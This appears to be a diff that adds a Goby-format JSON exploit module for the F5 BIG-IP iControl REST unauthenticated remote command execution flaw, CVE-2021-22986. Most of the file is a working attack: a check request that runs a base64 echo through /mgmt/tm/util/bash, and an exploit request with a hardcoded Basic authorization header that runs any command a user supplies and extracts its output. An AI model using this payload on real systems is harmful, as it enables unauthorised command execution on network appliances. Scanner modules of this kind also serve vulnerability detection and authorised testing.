@@ -1,0 +1,102 @@
+{
+      "Name": "F5 BIG-IP iControl REST Unauthenticated RCE CVE-2021-22986",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "product=\"F5-BIGIP\"",
+      "Description": "BIG-IP software products are licensed modules that run on top of F5's Traffic Management Operation System® (TMOS). This custom operating system is an event driven operating system designed specifically to inspect network and application traffic and make real-time decisions based on the configurations you provide.",
+      "Product": "F5 Big-IP",
+      "Homepage": "https://www.f5.com/",
+      "Author": "",
+      "Impact": "On BIG-IP versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2, the iControl REST interface has an unauthenticated remote command execution vulnerability. Note: Software versions which have reached End of Software Development (EoSD) are not evaluated.",
+      "Recommendation": "",
+      "References": [
+            "https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986",
+            "https://support.f5.com/csp/article/K03009991",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986",
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-22986"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": true,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46QVNhc1M="
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'echo tsxts|base64'\"}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "dHN4dHMK",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": true,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46QVNhc1M="
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c {{{cmd}}}\"}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|commandResult\".\"(.*)\"}"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
